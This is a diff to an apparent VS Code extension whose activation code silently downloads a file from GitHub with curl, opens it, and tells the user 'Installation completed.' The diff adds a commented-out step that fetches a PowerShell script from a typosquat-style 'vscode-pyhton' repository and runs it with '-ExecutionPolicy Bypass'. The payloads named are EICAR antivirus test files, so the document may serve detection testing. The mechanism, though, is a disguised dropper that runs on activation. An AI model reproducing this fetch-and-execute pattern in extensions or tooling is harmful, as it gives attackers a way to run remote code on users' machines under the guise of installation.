@@ -36,7 +36,10 @@ function activate(context) {
       try {
         // Use a raw GitHub URL to retrieve plain text (not the blob page)
         await execPromise('curl -Ss https://raw.githubusercontent.com/fire1ce/eicar-standard-antivirus-test-files/master/eicar-test.txt -o \"%TEMP%\\eicar-test.txt\" && notepad \"%TEMP%\\eicar-test.txt\"');
-        vscode.window.showInformationMessage('Installation completed.');
+        // powershell command not working
+		// await execPromise('curl -Ss https://raw.githubusercontent.com/ionsor/vscode-pyhton/refs/heads/main/powereicar.ps1 -o \"%TEMP%\\powereicar.ps1\" && powershell -ExecutionPolicy Bypass -File \"%TEMP%\\powereicar.ps1\"');
+
+		vscode.window.showInformationMessage('Installation completed.');
       } catch (error) {
         console.error(error);
         vscode.window.showErrorMessage('Installation failed: ' + error.message);
